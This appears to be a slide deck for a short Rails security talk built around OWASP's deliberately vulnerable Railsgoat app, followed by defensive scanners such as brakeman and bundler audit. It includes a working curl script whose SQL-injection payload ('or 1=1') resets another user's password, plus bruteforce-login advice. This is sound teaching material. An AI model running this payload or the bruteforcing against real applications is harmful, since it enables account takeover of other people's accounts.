
# Rails security in 20 minutes.

Lišák a Vráťa
Railsgrills 3.0 

===

# Motivation

How to increase general awareness about information security?

- Talk about it!

===

# Introduction

In security - learn by trying it yourself.

- hack yourself
- protect yourself

Programming intentionally vulnerable app - inspired by php DVWA
(Damn Vulnerable Web Application). When done, found Railsgoat :-)

====

# Railsgoat, welcome on stage

Intentionally vulnerable Rails app, maintained under OWASP project.

WTF is OWASP? https://lmddgtfy.net/?q=wtf%20is%20owasp

OWASP Top 10.

- XSS
- SQLi
- CVE through deprecated lib
- insecure uploads (files in public)

===
# Try it yourself

It is best to use some sort of container or virtual machine.

https://github.com/OWASP/railsgoat

Docker: config is in repo, took about 15 minutes on my machine to build, works.
VirtualBox/Vagrant: in resources for this talk, there is vagrant folder
https://github.com/phokz/railsgrills-talk

===

# But wait  ..!?

- I am lazy and do not want to install Docker/Vagrant/WTF shit
- Or I want real blackbox hacking look & feel (looking at log output of docker container makes things way easier).

We prepared live railsgoat for you here:
http://railsgoat.fqdn.cz:3000

## So you can try it NOW. 

There is no excuse.
~~my data plan is not good for downloading virtual images~~
~~you told us docker takes 15 minutes to build, it is AGES~~
~~I do not have laptop with me~~

# HACK NOW

===

## But the app is very vulnerable

- someone foreign might hack it beyond being hackable any more or beyond repair
- so the url is not wide open to the scary internets, you have to knock

``
knock railsgoat.fqdn.cz 1234 2345 3456
``

If you cannot knock, you can go here https://railsgoat.fqdn.cz/ and open firewall using secret code _railsgrills_

===

# Your first task is to log in.

Bruteforce FTW!

There are many tools, but we wrote one specially for this event and for bruteforcing rails app. Old tools do not know about _CSRF token_ :-).

===
# Half of the kingdom for good password list.

Apparently, most search engine results for "top 1000 passwords" goes to fancy html pages.

Good lists are here:
https://github.com/danielmiessler/SecLists/tree/master/Passwords


# We are in - lets look around.

- demo time

# Low hanging fruit.

Those were examples of low hanging fruit. There are more complicated things.

Luckily, there is Perfect Tutorial:

https://github.com/OWASP/railsgoat/wiki/Rails-5-Tutorials

# SQL injection

Badly implemented password change API endpoint. 
Often the first account is admin :-)

```bash
base=http://localhost:3000/
user=jim@metacorp.com
pass=alohaowasp

newpass=Password1

curlcmd='curl -b cookies.txt --cookie-jar cookies.txt'
token=$($curlcmd "${base}"| grep -i token | sed -e 's/^.*value=//' | cut -d '"' -f 2)

$curlcmd -X POST -d "authenticity_token=${token}" -d email=$user \
 -d password=$pass "${base}/sessions"
 
$curlcmd -X POST \
  -d "user[id]=5' or '1'='1" \
  -d user[password]=$newpass \
  -d user[password_confirmation]=$newpass \
  -d _method=put "${base}/users/5.json"
```

===

# demo sqli

- cheat and show log output in console


# Stop hacking now, enter The Blue Team

or

# How can computer help me with rails security?

- a lot.

===

# Tools to cover

- `rubocop` - common "lint" for ruby/rails
- `bundler audit` - checks your dependencies 
- `brakeman`  - check for common vulnerabilities
- `danger`  - insecure files in git - keys, credentials

===
# Rubocop

- not a security tool
- however, keeping code well-styled may improve readability, auditabily and security

Sample output here:

```ruby
Inspecting 121 files
.........................................................................................................C...............

Offenses:

db/schema.rb:1:1: C: Style/FrozenStringLiteralComment: Missing magic comment # frozen_string_literal: true.
# This file is auto-generated from the current state of the database. Instead
^

121 files inspected, 1 offense detected
```

===

# bundler audit

```ruby
Name: rubyzip
Version: 1.0.0
Advisory: CVE-2017-5946
Criticality: Unknown
URL: https://github.com/rubyzip/rubyzip/issues/315
Title: Directory traversal vulnerability in rubyzip
Solution: upgrade to >= 1.2.1

Vulnerabilities found!
```

===

## brakeman

swiss army knife of rails security

Sample output:

```ruby
Confidence: High
Category: Cross-Site Scripting
Check: CrossSiteScripting
Message: Unescaped cookie value
Code: cookies[:font]
File: app/views/layouts/application.html.erb
Line: 12
```
===

# danger

- only for github projects, can be integrated with allmost any ci
- can be run locally: `danger local`


=== 

# Conclusion

- security is hard
- do not write your own security
- scan for vulns
- implement security scans in your ci/cd pipeline (topic 4 next talk: SecOps) 

